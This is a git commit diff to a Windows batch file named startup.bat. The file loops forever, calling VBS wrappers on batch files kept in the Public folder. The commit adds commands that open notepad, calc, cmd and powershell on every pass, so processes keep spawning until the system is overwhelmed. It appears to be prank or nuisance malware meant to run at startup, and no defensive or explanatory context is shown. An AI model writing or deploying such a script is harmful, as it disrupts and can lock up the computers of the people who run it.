0f1a6e4fa23ba44f59ebc9fd6c602cc9b4850960
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 02:13:26 +0000

    Update startup.bat

--- startup.bat
+++ startup.bat
@@ -1,9 +1,13 @@
 @echo off
 :loop
-wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\filel.bat
-wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
-wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
-wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
-wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\startup.bat
-wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\lulz.bat
+wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
+wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
+wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
+wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
+wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
+wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\lulz.bat
+start notepad
+start calc
+start cmd
+start powershell
 goto loop
